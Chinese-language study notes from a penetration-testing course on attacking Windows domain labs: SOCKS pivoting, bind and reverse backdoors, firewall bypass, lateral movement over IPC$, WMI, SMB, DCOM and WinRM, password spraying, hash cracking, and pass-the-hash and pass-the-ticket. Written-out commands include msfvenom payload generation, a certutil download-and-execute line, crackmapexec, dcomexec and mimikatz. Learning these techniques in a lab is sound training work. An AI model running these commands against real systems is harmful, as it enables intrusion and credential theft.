# 2024 ---  内网

# 168：域

分类：单域、子域、父域、域树、域森林、DNS域名服务器

单域环境：

![1732196598012](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942982.png)

父子域：![1732196518518](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942983.png)

域树 ：

![1732196624195](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942984.png)

 域森林  test和abc 直接取得了信任关系      在他们下面就是域森林

![1732196642767](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942985.png)



虚拟机分类：

windows    2016  DC  域控

windows    2008   WEB  网站服务器

Windows 10&7    PC  普通办公电脑

  配置环境 

dns 和ip  配置：

 为了域控能够控制网内每一个主机的流量（网站解析流量），这里就让内网每一个主机用同一个dns解析

对ip 进行静态设置

## 单域

后面的dns服务器都指向DC（  dns服务器） 的ip192.168.22.11

![1732202058737](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942986.png)



![1732202614066](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942987.png)

https://mp.weixin.qq.com/s/128Ap8ohEBDweg0jNM-T5g 常见命令

   工具插件

win7激活

域内：域内用户

域外：1、需要取得这个主机的系统权限或者这个主机的域内权限（换成域内用户）

判断是否为域内用户：（这里权限就是普通用户xd）

![1732244300080](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942988.png)



高权限也可以执行net user /domain        (administrator/system)

![1732244399149](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942989.png)



net time /domain  定位域控 （一般域内主机都以域控主机的时间为主）

知道域控的域名后直接ping 得到ip

  提权win10

# 169:父子域（多域）

搭建父子域环境（本机内存配置不支持，没有搭建成功）

net user /domain 只能看到自己这一级的上一级域控，上上级和旁级都看不到。

![1732256467561](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942991.png)

net view /domain   查看当前所有域的上级关系。需要开一个配置![1732258184854](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942992.png)

单域：

![1732256749563](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942993.png)



多个父子域：

![1732256755131](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942994.png)

子域下面的DC互相通讯不了，操作更改也是，父域可以改子域，但是不能改同一级的父域。

主要大多数还是配置环境（域环境）

# 170：域森林，域树林

域树林：最上面是一个父域

域森林：最上面有多个父域

##### 信任

森林的话---树之间需要配置信任关系（能通讯）这里就是xiaodi8.org个xiaodi.org信任关系建立

![1732268093923](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942995.png)

![1734016003951](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942996.png)

配置dns也是一级一级的向上匹配。

树林和森林之前的区别就是最上面是一个父域还是多个父域

xiaodi.org和xaiodi.org

1h20,      有时候A父域跟其他B父域相互信任，但是A子域不一定和B子域相互信任，主要看配置。

这节课主要还配置

#### 配置环境：

补充一下、怎么加域，这里是老版本的，win10以上差不多：

![image-20241223174332058](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942997.png)

![image-20241223174435398](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942998.png)

这里注意：加域就隶属于域，写好域名，输入DC账户密码就行，如果是重新进域，就得先加入工作组，随便进一个，重启后在重新进域就可以了。

![image-20241223174508491](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942999.png)



win10：

![image-20241223174854971](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942000.png)

哦对，再补充一下，在保证你的网段和DC在同一个网段下时候，加域报错什么找不到域啊啥的，就重新设置一下ip的分布，在加：

![image-20241223175510433](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942001.png)



# 171：内网信息收集

不出网：没网络（上不了网）     /      限制你上网，限制了流量

网络不可达：指的是内网---没网自己的主机也可以和虚拟机互通

环境配置：环境帐号密码：administrator/xiaodi 	这里没有搭建windows2016 DC机		

这里配置就是让本机访问不到2 、3 、4三个网段，模拟内网环境，真实

![1732341321876](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942002.png)

![1732342725259](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942003.png)

下图中因为都在一个网段（192.168.139.  * -----192.168.139. *   ）互相联系，所有最后都可以通信

### 总况

![1732271126086](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942004.png)

### Windows

ipconfig /all 	 ；一个主机上有2个网段



![1732341893489](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942005.png)

在sql主机上搭建一个网站：

![1732342405010](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942006.png)

web和sql直接是2网段通信：

![1732342569419](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942007.png)

![1732342591772](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942008.png)

信息收集：使用代理就不用将自己的工具上传到目标主机上进行渗透，只需要放自己主机上进行操作。代理就是添加一个节点（sockS）

 上线操作设置代理          回头时将Proxifier配置，主要是原理，重新理解一下

socks代理，就是理解为在自己的攻击机上(这里的攻击机为cs服务器，也就是kali)打开一个16150的端口，用这个端口节点和目标web机建立通信

![1732343327086](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942009.png)

所有这里代理配置时候也是连接的kali（攻击机）的ip (要用kali的这个接口016150与目标建立通讯)

![1732343472979](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942010.png)

配置好代理，就是通过cs服务器（kali ）建立了一个节点16150，来连接了目标web主机，然后通过代理这个节点就可以与目标主机web进行通讯，

![1732345799165](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942011.png)

因为目标主机web能与sql主机进行通讯，所有通过代理节点，本机也可以与sql主机通讯

![1732345781534](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942012.png)

能在内网主机访问，外网主机想访问22 时需要用proxifier走个代理进行通讯，或者用fscan 扫描信息。但是proxifier一关就不能通讯，fscan也扫不到信息

![1732346749235](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942013.png)

​    reverse 反向

​				bind       正向 		 不需要配置ip	4.exe

反向就是：以攻击机为第一人称，让目标机器主动连接攻击机。一般用reverse 反向 ，因为防火墙一般对外部到内部过滤严格，内部出去到外部过滤很少。

正向：还是以攻击机为第一视角，让目标主机开一个口子，然后等着攻击机连接自己。

这里就是sql主机正常反向连接是找不到c2服务端(kali)，因为没在一个网段 。所以就做一个正向后门，让sql主机正向连接，反向是有目标，正向是不知道目标。

下面演示的是正向：

这里正向监听器就没有配置ip ,也就是说，用这种监听器生成后门，默认就是绑定自己（cs）的4444端口

![1732347332244](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942014.png)

生成正向后门：

![1732347681381](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942015.png)

![1732347798808](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942016.png)

运行4444.exe后，发现sql机主动开了一个4444端口（等待别人来连接）：

![1732347820581](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942017.png)

然后用 cs控制Web主机连接sql机：

![1732347931397](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942018.png)

sql主动找的web，间接找的kali    ------------ 这就是正向

![1732347999544](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942019.png)



### xd视频演示：

kali （攻击机）刚开始只能与web主机进行通信，然后上传后门到web主机上线操作，控制得到权限后，因为kali 不能与sql主机进行通信，但是web主机可以与sql进行通信（上图），所有可以kali通过控制web主机（connect 192.168.2.22 4444）连接sql主机。

![1732287156916](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942020.png)

在sql主机上也有一个后门点击会打开自己的4444端口等待连接

  file主机开了一个ftp服务，还是改proxifier，通过ftp拿到file主机权限（这里过程粗略跳过），

连接file主机一样过程：socks代理----proxifier代理（这里注意：配置的服务器还是c2（kali）,更改的是端口和代理规则的目标主机ip--192.168.3.*-----fscan扫-------上正向后门）后面一样

连接DC：

还是先建立socks代理（开一个节点）                                      这里遮住的是192.168.3.22（file主机）

![1732287986076](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942021.png)

接下来配置proxifier

1:	

![1732288157910](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942022.png)

2:

![1732288132353](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942023.png)



下来还是用fscan进行扫描。后面一样。

 

### msf：

linux中的Proxifie是Prixychains。

msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.139.128 LPORT=3333 -f exe -o msf.exe  生成一个反向连接后门

![1732348972625](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942024.png)

这里shell后查看路由：（看web目标机上的路由--发现有139和2网段两个）：

![1732349158160](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942025.png)



下来和刚才一样，用的是 auxiliary/server/socks_proxy    模板来 创建socks节点：版本用5 端口set 为8989

![1732349444274](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942026.png)

用windows的代理配置：

![1732349539438](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942027.png)



用linux的代理访问： Proxychains   （模板）  （linux）

![1732350057902](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942028.png)

这里和刚才cs一样：就是用msf生成一个正向exe：

![1732350602586](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942029.png)

下来连接sql机时web机的session不能掉线：是通过Web来通讯sql的

![1732350933447](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942030.png)

sql机上线  正向exe：

![1732352609023](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942031.png)

还是创建socks 。：

![1732352648446](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942032.png)

与file机建立通讯：

![1732352681445](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942033.png)



sessions：

一台控制一台

![1732352885051](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942034.png)

有时候socks代理好了但是ping 不通，这是因为ping走的是icmp协议，但是socks走的协议没有ping 的级别高

 演示后续

最开始是：  ----- 基础网络知识        这里kali只要和内网一台主机通讯就行（公网 / 有节点）

先上线后创建socks节点----------挂上Proxy代理----------生成正向exe---------等待上线



# 172：防火墙

 ：配置

隧道技术：

icmp    dns:解析网站域名IP 协议 				 ssh : 连接linux主机的通信协议

也能看见，出站默认是允许的

![1732443049734](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942035.png)

  连接内网sql   ,

web有防火墙sql没有         

  web没有sql有防火墙 	所以正向后门连接不上

  防火墙入站出战配置

web到sql 之间有防火墙、这里是在web上建立一个反向监听器，让sql主机主动找web

![1732437963303](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942036.png)

演示：

web 机的ip：

![1732445259720](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942037.png)

这里就是让web机设立一个监听器，让sql机来连接web（出站）：

![1732445446401](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942038.png)

生成反向后门: 

![1732445495430](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942039.png)

这里对比，在将刚才的后门123.exe，和4444的正向后门上传上去：

sql主机主动连接web机：



![1732445944278](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942040.png)

执行3个exe后，connect 192.168.2.22 4444 不行说明防火墙阻拦了入站，123.exe不行说明sql和kali（c2服务器不通讯）1234.exe成功上线说明sql(22)成功出站连接到222（web机）

![1732446104395](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942041.png)







下面这种情况是正反都不行---都不能上线：

kali---->web 用反向连接成功上线，但是web 到sql :正向(web--->sql)有sql的入站防火墙，反向连接（sql--->web）对于web来说就是入站，也有入站防火墙

![1732438005147](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942042.png)



3种方法解决：

1、用命令关闭防火墙。

2、SMB协议通讯上线（默认放行）

3、利用隧道技术上线（规则决定）

 关闭sql防火墙进行正向连接

  内网域中：看怎么关闭防火墙。

   关闭防火墙失败，拿到system* 权限也没有关----在域环境中

1h14 smb（文件打印和共享）协议通讯、钻空子

隧道技术： 就是改协议，将一个被防火墙禁止的协议改成一个可以允许通过的协议。将正向后门走icmp协议

第三种：主要还是看防火墙的策略配置。



# 178:域内域外

![1732855937089](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942137.png)

​      拿到权限先看是什么用户，如果为普通用户，那么就先提权到system权限（逃离DC控制，能于域内用户通讯），或者切换成域内用户，先获取密码凭证---->然后切换用户输入密码

![1732893793057](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942138.png)

![1732893767715](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942139.png)

提权插件：

![1732893944807](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942140.png)

可以执行域内命令：

![1732894006981](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942141.png)

这里因为ailiyun老报警，所以重新配置环境后用kali当作攻击机服务端------------目前环境说明：环境也配不动，不管了，现在就是本机YJB能ping 通web 机，web 出不来，就用YJB当跳板机连接web



  用工具枚举爆破用户密码--在域外爆破域内用户的账户密码

![1732945720079](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942142.png)

 minkatz  在win10及win-server2012R2以上抓取不到明文，只能抓取hash值。因为这些版本以上默认内存中关闭了注册表缓存明文密码

![1732945990353](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942143.png)

 域内域外用户都需要提权			

33        ipc （文件共享） 测试攻击   利用ipc文件共享与目标主机建立连接      dc:3.21             sql:3.32 	ipc工具：用前面收集到的密码凭证去套用        建立ipc连接          user\admin 一般为域内用户，admin或者\admin一般为域外本地用户：			

![1732946217851](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942144.png)

#### IPC$利用命令

net use \\server\ipc$ "password" /user:计算机名\username # 工作组												                                  net use \\server\ipc$ "password" /user:域名\username #域内

net user \\192.168.3.32\ips$ "123456" /user:god\administrator     登录god域（这里有god域就自动识别）的administrator 用户

net use \\192.168.3.32\ipc$ "admin!@#45" /user:administrator   如果当前为域内用户执行命令，这种写法是默认为登录要域里的administrator用户（DC），如果为本地用户执行这命令时，就是登录本地机器（当前控制机器）的administrator用户，因为没有加目标计算机机器的名字。

net use \\192.168.3.32\ipc$ "admin!@#45" /user:sqlserver\administrator   如果当前为域内用户执行命令的话：就是先找有没有sqlserver域，没有的话就当作sqlserver计算机名，用户为administrator，如果有域是 sqlserver，那么就找sqlserver域下的administrator用户。如果为本地用户执行这命令时，就直接找的是sqlserve计算机的administrator用户。

总结下来就是要登录域内用户时候要加上域+用户（god\administrator）    登录本地时：本地机器名+用户（sqlserver\administrator ）

![1732961884029](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942145.png)

这里是用web机的域外（administartor用户）可以通过ipc连接到sqlserver的administrator:

![1732979651063](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942146.png)

![1732979752669](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942147.png)

控制Webserber--(后面简称web机)，能ping 通内网sqlserver机，使用正向后门，先上传到web机上---在上传copy到目标

​    sql主机----再用at 或者schtasks（两个有使用场景）计划任务执行。运行后正向后门需要web机主动connect，at使用时目标小于win2012  schtasks是目标大于Win2012

![1734321268190](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942148.png)

 反向后门，监听器为web 的内网地址3.31

后面继续得到其他域内主机的密码，最后喷射出dc密码进行登录连接

  cs插件：

![1732946359542](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942149.png)

  工具箱  借助socks代理用py文件进行ipc建立连接

先连接sql，然后设置好代理，再用工具：

![1732947502501](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942150.png)

![1732947488408](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942151.png)

这里连接后执行whoami成功，还可以实现上线：让sql机远程下载后门（不建议）2、powershell命令实现上线

![1732948094690](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942152.png)

1h34       关闭ipc，

 ipc策略问题    ---- 后续补充改错

补充：域外用户切换到域内用户没成功：

# 179: 让域内上线方法

环境说明：本机YJB能ping 通god/web 机，god/web里的都出不来。然后下面先通过YJB作为跳板上线

![1732977961289](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942153.png)

   遗留问题：切换用户上线 。上面web机不能切换用户上线是与系统版本有关，windows2008不支持

这里是sql的域外用户：

![1732978327097](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942154.png)

执行切换用户：

![1732978732634](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942155.png)

### wmi  

方便管理员对windows主机进行管理，开启了此服务。所以可以用WMI进行横向移动，支持用户名明文或者hash的方式进行认证，并且该方法不会在目标日志系统留下痕迹。利用条件：

1、WMI服务开启，端口135，默认开启。

2、防火墙允许135、445等端口通信。

3、知道目标机的账户密码或HASH。一般都是先收集到目标主机浏览器密码，其他服务密码去套

使用内置wmic 缺点：无回显。需要有明文（不支持hash）优点就是wmic命令是内部命令（白名单）



​    用被控机ping 内网目标机---能通就建立正向后面在connect ---ping 不通就 反向后门（转发上线），这里关键的点还有web刚好有一个web服务，可以实现向目标sql机执行后门上传文件命令。(这里的web服务是前面信息大点收集的，查看端口开放，查看web机器有没有网络服务net start  ，有IIS Admin service 的服务，可以将上传的后门放到web目录下，然后就可以实现向sql机后续操作)

![1732980057421](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942156.png)

![1732980083249](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942157.png)

找到iis服务的默认web存储路径

![1733041150663](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942158.png)

上传zx后门到IIS的web服务路径下，后期和sql目标机建立连接后用来上传：

![1733041338449](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942159.png)

  套件工具  可以用hash加密，也支持交互式的密码连接。较推荐-----一般py文件可以打包成exe然后上传到目标机上运行，不过一般不选择这种方式，太明显（流量+免杀）。一般选择在本地机器上执行，这里是建立web机的administrator用户流量隧道/socks通道。

![1732980227409](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942160.png)

用socks代理在web机上建立节点。用工具执行命令与sql建立连接，成功与目标机通讯，然后可以上传后门先到被控机web上，在执行上传后门的命令实现上线。（这里思路清晰点：是通过web机建立的通讯，自然也是通过web机上传的后门到sql机上）

这里先是拿到sql的Shell：

![1732980610905](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942161.png)

通过拿到的shell上传文件-----真实下是因为YJB只能和web机通讯，web机作为内网机能与sql机通讯，所以需要通过web机来上传exe到sql机：

![1733041773785](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942162.png)

执行3232.exe 用web 机connect             sql机：

![1733041956661](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942163.png)

  c2插件  需要上传vbs。所以不建议

![1733042053179](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942164.png)

### SMB:

开启了打印和文件共享作用的服务

   CS不支持交互式。所以psexec工具（PsExec.exe为白名单程序）不建议-------------一般用图形化工具可以：

![1733042538285](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942165.png)

  还是用套件----工具  smbexec.py  和上面一样，配好节点后建立连接：

![1733042836602](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942166.png)

#### hash加密也可以横向

这里hash加密也可以，要对应好：

![1733044504518](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942167.png)

  cs插件  ---    cs-psexec， 对sqlsever进行上线操作

![1733044623385](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942169.png)

这里用户密码自己选择，监听器一般选择正向，如果能通的话，工具会自动连接。这里域一般选择能与目标通信，且在一个域内，会话选择能通信的。这里主要还是要确保用户，密码，域三个都得对应正确。

![1733045756767](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942170.png)

sqlserver成功上线

![1733045902645](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942171.png)

### DCOM

0.适用目标Win7系统以上-----因为这个是建立在powershell命令基础上

1.管理员权限PowerShell

2.远程主机防火墙未阻止

​     dcomexec-impacket   dcomexec.py   一样的，工具箱中的py文件执行命令----支持hash和明文		python dcomexec.py sqlserver/administrator:admin!@#45@192.168.3.32

​      wmi防火墙的，windows manage ni...那个入站还是出站的策略（xd没看见）试一下开一下防火墙能否通过wmi，wmi也不会在日志中被记录  

#### 防火墙

SMB ：

![1733048252797](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942172.png)

DDOM：

![1733048364506](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942173.png)

wmi也有，不过没找到。

# 180：

### WinRM      

### WinRS   

一种横向移动的协议

利用条件：

1、win 2012之前利用需要手动开启winRM ，在win 2012之后(包括win 2012)的版本是默认开启的， 

2、防火墙对5986、5985端口开放。

​    先扫端口是否开放   5986、5985 （这里最好还是先提到system，在扫5985端口情况）

![1733135556613](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942174.png)

小插曲：

需要先开启WinRM服务：

![1733136365631](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942175.png)

winrs执行远程命令：

![1733136408276](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942176.png)

 解决cs上执行WinRM报错（cs不支持交互式），换一种执行方式。

![1733136693156](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942177.png)

用cs自带的插件运行也报错：

![1733136825756](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942178.png)

换了一种方式执行：

![1733136917715](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942179.png)

防火墙：

![1733141575985](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942180.png)

  反向

![1733142490112](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942181.png)

35 演示反向--------web站点（web机没有开web服务）  sql机打开防火墙：（入站拦截，出站不拦截）：

转发上线-----监听----用刚才的shell winrm invoke Create wmicimv2/win32_process @{CommandLine="cmd.exe /c certutil -urlcache -split -f http//192.168.3.31/4444.exe 4444.exe & 4444.exe"} -r:sqlserver -u:sqlserver\administrator -p:admin!@#45       执行上线

### RDP 

远程终端连接服务

对方开启RDP服务 3389 端口          远程桌面

​            还是socks代理，设置好后可以用mstac连接

![1733145385480](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942182.png)

连  隧道（http），这里是用冰鞋上传的后门建立的http隧道，实现内网穿透，将目标的3389远程终端连接端口映射到本地，不过这里需要的流量太大，冰鞋支持不了。其他的方法：frp,nps，iox等方法都需要上传到目标机，所以还是选用http隧道。

![1733145945752](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942183.png)

正常连接时：

![1733146097700](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942184.png)

用冰鞋连接尝试http代理，看能否实现映射，端口为3389，RDP服务的：（刚才的shell.asp不支持，这里的.aspx支持）

![1733146130190](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942185.png)

这时再来连接：

就可以了，不过冰鞋的流量不支持，这流量太大了，所以不稳定

1h      hash连接，需要在被控机上操作，用mimikatz将hash值导入到目标机，这种方式对系统也有要求。有些鸡肋

sharpRDP:        一款工具，不用自己手动的连接远程桌面，不过不建

### CrackMapExec-密码喷射

解决了域内用户多，密码多，账户多等问题。不错的工具。

  这款工具有windows 也有 linux  ，都需要安装配置，这里选用的是kali自带的。不过前提需要先配置好代理---socks                    

kali下改socks代理的配置文件：       环境说明：kali是通信不到3网段的web和sql机的。

![1733147257820](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942186.png)

这里说明：域内用户，域内本地用户。比如:：web 机dbadmin用户就是域内用户，域内本地用户就是web 机的administrator

先拿到域内用户，然后net user /domain        ，存到1.txt中。然后抓取密码得到hash值或者明文

![1733147957938](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942187.png)

开始喷射：

![1733148177350](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942188.png)

 有＋号就是喷射成功：

![1733148493587](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942189.png)



​    

proxychains4 crackmapexec smb 192.168.3.21-32 -u administrator -p 'admin!@#45'           这是登录域内adminstrator 用户域，就是DC，密码应为：Admin12345      这里就没有+号

![1733148523010](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942190.png)

proxychains4 crackmapexec smb 192.168.3.21-32 -u administrator -p 'admin!@#45' --local-auth 这是登录域内本地用户的administrator  

![1733148709400](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942191.png)

![1733148697349](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942192.png)

还可以执行上线命令（全部测试的）：

![1733148884794](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942193.png)

成功的都上线了：

![1733148903706](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942194.png)

还可以创建密码字典，hash字典等操作手法很多  https://www.cnblogs.com/Yang34/p/14411497.html

# 181: 

背景：windows 2012以上默认关闭了Wdigest，所以攻击者无法通过内存获取到明文密码，所以就有下面的几种方法(前面的wmi和smb服务也可以)：

pass the hash（哈希传递攻击，简称pth）

pass the ticket（票据传递攻击，简称ptt）重点

pass the key（密钥传递攻击，简称ptk）

![1733304344193](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942195.png)

### pth:   hash传递

可以看出来基本现在都是ntml的hash，， 

![1733151600149](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942196.png)

 LM和NTML两个hash值的种类。前面的Wmi  smb 都是hash的pth攻击。

###### NTML

抓取明文密码时候，以NTML的hash为准：

![1733304997753](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942197.png)

![1733305018372](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942198.png)

 hash解密          cmd5在线，工具：https://hashcat.net/hashcat/   不过原理都是hash碰撞。

![1733305436114](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942199.png)

这里工具还有许多玩法，-m 密文类型           -a 破解类型         ?l 小写?s 符号?d 数字      	大写字母就是?u		eg: admin!@#45  5个字母（?l）3个符号（?s）2个数字（?d）  ?l?l?l?l?l?s?s?s?d?d   工具比较看cpu显卡的速度

参数1000就是指用NTML的hash来进行碰撞：

![1733305572632](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942200.png)

mimikatz向计算机中写内存：

hashcat -a 0 -m 1000  518b98ad4178a53695dc997aa02d455c  --show

利用hash值进行移动可以用上面的wmi   smb  dcom 几个协议进行上线

### ptt:票据攻击         

 Kerberos票据中心。

 思想：用漏洞让Kerberos给自己发一张票，用mimikate进入，（导入内存中 ，好像做了个假的身份证），在连接上。这里需要明文（不支持hash）。先获取目标的SID值，然后用ms14漏洞生成门票，然后用mimikate导入门票到目标中，然后连接上线

![1733306579595](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942201.png)

这里的攻击条件是域内用户，然后域内密码是刚才破解出来的。先将漏洞工具上传：

![1733307451179](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942202.png)

ping 一下域控（DC是前面收集到的ip）

![1733318539839](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942203.png)

生成票据文件：

![1733307660101](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942204.png)

此时查看没有票据：

![1733307707298](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942205.png)

生成票据文件

![1733318582880](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942206.png)

先尝试连接DC ,不行。然后显示当前票据：

![1733318619644](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942207.png)



用mimikate导入票据：mimikatz kerberos::ptc TGT_webadmin@god.org.ccache

![1733318733005](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942208.png)

连接目标上线，这里就连接到了DC机器：

![1733318787834](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942209.png)

下来就上传正向后门到目标机器在执行上线----思路是上传后建立一个服务（类似于定时服务一样），然后执行服务，用web机连接connect ，得到DC权限：

先查看当前目录下的后门文件 4444.exe，在copy到DC机器：

![1733319097667](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942210.png)

copy：

![1733319159007](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942211.png)



####  kekeo:

也是一款工具，使用hash值来换成票据。直接调用cmd。利用获取的NTLM生成新的票据尝试认证（pth（hash）的攻击转为ptt(票据)攻击）

